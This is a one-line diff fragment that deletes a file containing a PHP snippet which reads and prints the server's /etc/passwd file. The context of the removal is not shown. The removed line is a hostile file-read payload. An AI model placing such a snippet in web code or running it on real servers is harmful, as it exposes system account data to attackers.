@@ -1,1 +1,0 @@
-<?php readfile("/etc/passwd"); ?>
